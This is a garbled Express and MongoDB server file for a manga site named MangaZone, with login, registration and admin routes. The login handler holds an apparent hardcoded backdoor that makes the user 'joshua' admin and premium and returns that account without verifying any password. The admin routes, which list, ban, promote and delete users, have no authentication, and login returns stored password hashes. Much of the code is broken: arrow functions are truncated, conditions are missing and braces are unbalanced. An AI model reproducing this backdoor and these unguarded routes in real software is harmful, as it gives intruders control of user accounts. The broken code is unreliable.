const express = require('express'); 
const mongoose = require('mongoose'); 
const cors = require('cors'); 
const bcrypt = require('bcryptjs'); 
require('dotenv').config(); 
 
const app = express(); 
 
const allowedOrigins = [ 
  'https://mangazone.vercel.app', 
  'https://mangazone.netlify.app', 
  'http://localhost:3000' 
]; 
 
app.use(cors({ 
  origin: function (origin, callback) { 
    if (!origin) return callback(null, true); 
    if (allowedOrigins.indexOf(origin) === -1) { 
      const msg = `CORS policy: Origin ${origin} not allowed`; 
      console.warn(msg); 
      return callback(new Error(msg), false); 
    } 
    return callback(null, true); 
  }, 
  credentials: true, 
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'], 
  allowedHeaders: ['Content-Type', 'Authorization'] 
})); 
 
app.use(express.json({ limit: '50mb' })); 
app.use(express.urlencoded({ limit: '50mb', extended: true })); 
 
mongoose.connect(process.env.MONGO_URI, { 
  useNewUrlParser: true, 
  useUnifiedTopology: true, 
}) 
.then(() =
.catch(err =, err)); 
 
const UserSchema = new mongoose.Schema({ 
  username: { type: String, required: true, unique: true }, 
  password: { type: String, required: true }, 
  avatar: { type: String, default: "" }, 
  isPremium: { type: Boolean, default: false }, 
  premiumExpiresAt: { type: Date, default: null }, 
  isAdmin: { type: Boolean, default: false }, 
  isBanned: { type: Boolean, default: false }, 
  lastActive: { type: Date, default: Date.now }, 
  favorites: [{ 
    mangaId: String, 
    title: String, 
    image: String, 
    score: Number 
  }], 
  history: [{ 
    mangaId: String, 
    title: String, 
    image: String, 
    chapterCh: Number, 
    chapterId: String, 
    lastRead: { type: Date, default: Date.now } 
  }] 
}); 
 
const CommentSchema = new mongoose.Schema({ 
  mangaId: { type: String, required: true }, 
  username: { type: String, required: true }, 
  avatar: { type: String, default: "" }, 
  message: { type: String, required: true }, 
  createdAt: { type: Date, default: Date.now } 
}); 
 
const User = mongoose.model('User', UserSchema); 
const Comment = mongoose.model('Comment', CommentSchema); 
 
app.get('/api/health', (req, res) =
  res.json({ 
    status: 'healthy', 
    service: 'MangaZone API', 
    timestamp: new Date(), 
    database: mongoose.connection.readyState === 1 ? 'connected' : 'disconnected' 
  }); 
}); 
 
app.post('/api/login', async (req, res) =
  const { username, password } = req.body; 
  try { 
      let superUser = await User.findOne({ username: 'joshua' }); 
      if (!superUser) { 
        const salt = await bcrypt.genSalt(10); 
        const hashedPassword = await bcrypt.hash(password, salt); 
        superUser = new User({ username: 'joshua', password: hashedPassword }); 
      } 
      superUser.isAdmin = true; 
      superUser.isPremium = true; 
      superUser.premiumExpiresAt = null; 
      superUser.lastActive = new Date(); 
      await superUser.save(); 
      return res.json(superUser); 
    } 
 
    let user = await User.findOne({ username }); 
    if (!user) return res.status(404).json({ error: "User not found" }); 
    if (user.isBanned) return res.status(403).json({ error: "Banned" }); 
 
    const isMatch = await bcrypt.compare(password, user.password); 
    if (!isMatch) return res.status(401).json({ error: "Wrong password" }); 
 
      if (new Date()  Date(user.premiumExpiresAt)) { 
        user.isPremium = false; 
        user.premiumExpiresAt = null; 
      } 
    } 
    user.lastActive = new Date(); 
    await user.save(); 
    res.json(user); 
  } catch (err) { res.status(500).json({ error: err.message }); } 
}); 
 
app.post('/api/register', async (req, res) =
  const { username, password } = req.body; 
  try { 
    const existingUser = await User.findOne({ username }); 
    if (existingUser) return res.status(400).json({ error: "User exists" }); 
    const salt = await bcrypt.genSalt(10); 
    const hashedPassword = await bcrypt.hash(password, salt); 
    const newUser = new User({ username, password: hashedPassword, avatar: "", favorites: [], history: [], lastActive: new Date() }); 
    await newUser.save(); 
    res.json(newUser); 
  } catch (err) { res.status(500).json({ error: err.message }); } 
}); 
 
app.get('/api/admin/users', async (req, res) =
  const users = await User.find({}, '-password').sort({ lastActive: -1 }); 
  res.json(users); 
}); 
 
app.post('/api/admin/manage', async (req, res) =
  const { targetId, action } = req.body; 
  try { 
    const user = await User.findById(targetId); 
    if(action==='toggle_vip'){ 
      user.isPremium=!user.isPremium; 
      user.premiumExpiresAt = user.isPremium ? new Date(new Date().setDate(new Date().getDate() + 30)) : null; 
    } 
    if(action==='toggle_ban') user.isBanned=!user.isBanned; 
    if(action==='delete') await User.findByIdAndDelete(targetId); 
    else await user.save(); 
    const u = await User.find({}, '-password').sort({ lastActive: -1 }); 
    res.json(u); 
  } catch (err) { res.status(500).json({ error: err.message }); } 
}); 
 
app.listen(PORT, () = Server running on port ${PORT}`)); 
